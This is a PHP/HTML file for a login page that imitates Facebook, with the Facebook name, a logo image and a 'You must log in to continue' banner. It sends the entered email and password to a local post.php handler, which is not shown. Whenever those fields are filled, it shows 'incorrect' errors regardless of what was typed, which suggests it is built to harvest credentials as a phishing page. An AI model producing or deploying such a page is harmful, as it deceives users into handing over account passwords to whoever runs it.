<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" href="/css/style.css">
<?php  
session_start();//session starts here  
?>  
<div class="row">  
    <div class="col-md-4 col-md-offset-4">
        <h1 class="d-flex justify-content-center text-primary">Facebook</h1>
        <?php
         ?>
        <div class="boder p-2 mb-2 d-flex bg-light">
            <li class="fa fa-exclamation-triangle text-danger"></li>
            <p class="mt-1">You must log in to continue.</p>
        </div>
        <div class="panel-body">
            <img src="" alt="">
            <div class="login-panel panel bg-form p-4">  
                <div class="panel-heading d-flex justify-content-center">  
                    <img src="/images/image 2.png" class="logo_facebook">
                </div><hr>
                <form role="form" action="/models/post.php" method="post">  
                    <fieldset>
                        <div class="form-group">
                            <?php 
                                if(isset($_POST['login'])) { 
                                    if($_POST['email']) {
                                        echo "<div class='alert alert-danger' role='alert'>Email incorrect!</div>";
                                    }
                                }
                            ?>
                            <input class="form-control" placeholder="E-mail" name="email" type="email" autofocus required>
                        </div>
                        <div class="form-group">
                            <?php 
                                if(isset($_POST['login'])) { 
                                    if($_POST['pass']) {
                                        echo "<div class='alert alert-danger' role='alert'>password incorrect!</div>";
                                    }
                                }
                            ?>
                            <input class="form-control" placeholder="Password" name="pass" type="password" value="" required>  
                        </div>  
                        <input class="btn btn-lg btn-primary btn-block" type="submit" value="log In" name="login" >  
                    </fieldset> 
                    <div class="form_group d-flex justify-content-center mt-4">
                        <b>Not Already registered ?</b><a href="index.php" class="ml-2">Sign up</a>
                    </div>
                </form>  
            </div>  
        </div>  
    </div>  
</div>  


